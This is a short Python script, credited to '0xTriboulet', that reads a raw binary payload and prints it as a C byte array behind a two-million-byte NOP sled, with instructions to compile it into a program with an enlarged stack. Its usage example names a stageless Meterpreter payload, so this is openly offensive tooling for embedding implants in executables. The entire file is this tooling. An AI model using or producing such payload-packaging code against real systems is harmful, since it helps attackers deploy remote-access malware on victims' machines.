import sys
# by 0xTriboulet
# Short python script that takes a raw binary payload
# and build a (big) nop sled over that payload
# put this large payload into your program and compile with:
# /STACK:3000000
try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    print("python2 pushingpayloads.py meterpreter_stageless.bin > out.txt")
    sys.exit()

print('unsigned char payload[] = { '+'0x90, '*2048000 + '0x' + ', 0x'.join(hex(ord(x))[2:] for x in plaintext) + ' };')